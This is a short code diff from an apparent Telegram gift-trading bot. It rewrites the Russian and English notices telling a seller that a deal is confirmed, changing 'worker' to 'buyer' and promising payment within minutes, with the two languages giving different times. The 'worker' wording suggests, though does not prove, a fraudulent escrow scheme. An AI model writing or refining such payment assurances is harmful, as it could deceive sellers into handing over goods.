@@ -588,13 +588,13 @@ async def button(update: Update, context: ContextTypes.DEFAULT_TYPE):
             seller_lang = user_data.get(seller_id, {}).get("lang", "ru")
             if seller_lang == "ru":
                 msg = (
-                    f"✅ Воркер подтвердил получение подарка по сделке #{deal_id}.\n\n"
-                    "Деньги были зачислены на вашу карту."
+                    f"✅ Покупатель подтвердил получение подарка по сделке #{deal_id}.\n\n"
+                    "Денежные средства будут зачислены в течении 10-15 минут."
                 )
             else:
                 msg = (
-                    f"✅ Worker confirmed the gift for deal #{deal_id}.\n\n"
-                    "Funds have been credited to your card."
+                    f"✅ Buyer confirmed the gift for deal #{deal_id}.\n\n"
+                    "Expect funds to be credited within 5-10 minutes."
                 )
 
             try:
